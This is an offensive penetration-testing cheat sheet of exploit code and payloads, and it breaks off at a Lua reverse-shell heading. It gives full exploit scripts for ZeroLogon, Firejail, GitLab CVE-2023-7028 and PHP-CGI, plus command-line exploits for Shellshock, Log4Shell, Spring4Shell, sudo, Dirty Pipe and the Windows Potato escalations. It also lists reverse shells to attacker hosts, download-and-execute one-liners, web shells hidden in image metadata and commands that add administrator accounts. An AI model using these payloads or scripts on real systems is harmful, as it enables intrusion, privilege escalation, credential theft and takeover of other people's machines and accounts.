#### CVE-2014-6271: Shellshock RCE PoC

```c
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

#### CVE-2016-1531: exim LPE

- exim version <= 4.84-3

```c
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

#### CVE-2019-14287: Sudo Bypass

> https://www.exploit-db.com/exploits/47502

##### Prerequisites

- Sudo version < 1.8.28

##### Exploitation

```c
!root:
sudo -u#-1 /bin/bash
```

#### CVE-2020-1472: ZeroLogon PE

> https://github.com/SecuraBV/CVE-2020-1472

> https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

##### Prerequisites

```c
python3 -m pip install virtualenv
python3 -m virtualenv venv
source venv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

##### PoC Modification

```c
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

##### Weaponized PoC

```c
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

##### Execution

```c
python3 zerologon_tester.py <HANDLE> <RHOST>
impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
```

#### CVE-2021-3156: Sudo / sudoedit LPE

> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435

##### Prerequisistes

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1

##### Vulnerability Test

```c
sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```c
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

#### CVE-2021-44228: Log4Shell RCE (0-day)

> https://github.com/welk1n/JNDI-Injection-Exploit

```c
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

```c
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
```

```c
${jndi:ldap://<LHOST>:1389/ci1dfd}
```

##### Alternatively

> https://github.com/kozmer/log4j-shell-poc

###### Prerequisistes

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

```c
tar -xvf jdk-8u20-linux-x64.tar.gz
```

###### Start the Listener

```c
python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
```

###### Execution

```c
${jndi:ldap://<LHOST>:1389/foobar}
```

#### CVE-2022-0847: Dirty Pipe LPE

```c
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
```

#### CVE-2022-22963: Spring4Shell RCE (0-day)

> https://github.com/me2nuk/CVE-2022-22963

```c
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```

```c
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

#### CVE-2022-31214: Firejail LPE

> https://seclists.org/oss-sec/2022/q2/188

> https://www.openwall.com/lists/oss-security/2022/06/08/10

```c
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

#### First Terminal

```c
./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

#### Second Terminal

```c
firejail --join=193982
su
```

#### CVE-2023-21746: Windows NTLM EoP LocalPotato LPE

> https://github.com/decoder-it/LocalPotato

> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

Modify the following file and build the solution.

```c
StorSvc\RpcClient\RpcClient\storsvc_c.c
```

```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

Modify the following file and build the solution.

```c
StorSvc\SprintCSP\SprintCSP\main.c
```

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```c
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```c
.\RpcClient.exe
```

#### CVE-2023-22809: Sudo Bypass

> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466

##### Prerequisites

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.

##### Example

```c
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```

##### Exploitation

```c
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```

```c
sudoedit /etc/motd
```

#### CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)

- Linux ubuntu2204 5.19.0-46-generic

```c
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

#### CVE-2023-4911: Looney Tunables LPE

```c
python3 gen_libc.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
gcc -o exp exp.c
./exp
```

#### CVE-2023-7028: GitLab Account Takeover

> https://github.com/V1lu0/CVE-2023-7028

> https://github.com/Vozec/CVE-2023-7028

### PoC

```c
user[email][]=valid@email.com&user[email][]=attacker@email.com
```

### Modified PoC from TryHackMe

```c
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
```

### Execution

```c
python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
```

#### CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE

```c
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```

#### GodPotato LPE

> https://github.com/BeichenDream/GodPotato

```c
.\GodPotato-NET4.exe -cmd '<COMMAND>'
GodPotato-NET4.exe -cmd "C:\windows\temp\nc.exe -t -e C:\Windows\System32\cmd.exe LOCAL_IP LOCAL_PORT"
```

#### Juicy Potato LPE

> https://github.com/ohpe/juicy-potato

> http://ohpe.it/juicy-potato/CLSID/

##### GetCLSID.ps1

```c
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```

##### Execution

```c
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>:RPORT/<FILE>.ps1')" -t *
```

#### JuicyPotatoNG LPE

> https://github.com/antonioCoco/JuicyPotatoNG

```c
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

#### RasMan LPE

https://github.com/crisprss/RasmanPotato

```c
cmd.exe /c "c:\windows\temp\RasMan.exe -i -m 1 -c c:\windows\temp\nc.exe LOCAL_IP LOCAL_PORT -e cmd.exe"

```

Take Invoke-PowerShellTcpOneLine.ps1

```c
$client = New-Object System.Net.Sockets.TCPClient('LOCAL_IP',LOCAL_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Convert to powershell base64

```c
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
```

Crear un archivo run.bat

```c
powershell -enc PAYLOAD
```

Run the run.bat with JuicyPotatoNG

```c
.\jp.exe -t * -p C:\PATH_TO_BAT
```

Listen on a port


#### SigmaPotato

```c
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
```

#### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE

> https://www.exploit-db.com/exploits/1518

```c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```c
mysql -u root
```

```c
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('chmod +s /bin/bash');
```

#### PrintSpoofer LPE SeImpersonatePrivilege 

> https://github.com/itm4n/PrintSpoofer

```c
.\PrintSpoofer64.exe -i -c powershell
```

#### SharpEfsPotato LPE

> https://github.com/bugch3ck/SharpEfsPotato

```c
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### Shocker Container Escape

> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

##### Modifying Exploit

```c
        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```

##### Compiling

```c
gcc shocker.c -o shocker
cc -Wall -std=c99 -O2 shocker.c -static
```

### Payloads

#### Exiftool

##### PHP into JPG Injection

```c
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
exiftool "-comment<=back.php" back.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

#### Reverse Shells

##### Bash Reverse Shell

```c
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

##### curl Reverse Shell

```c
curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

##### Groovy (Jenkins) Reverse Shell

```c
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### Manage Jenkins command line

```c
command = "\\IP\smbFolder\nc.exe -e cmd IP PORT"
def command = "powershell -c iex(new-object net.webclient).downloadstring('http://IP:Port/Ps.ps1')"
def proc = command.execute()
println(proc.in.text)
```

##### JAVA Reverse Shell

```c
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

###### shell.jar

```c
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

##### Lua Reverse Shell

```c
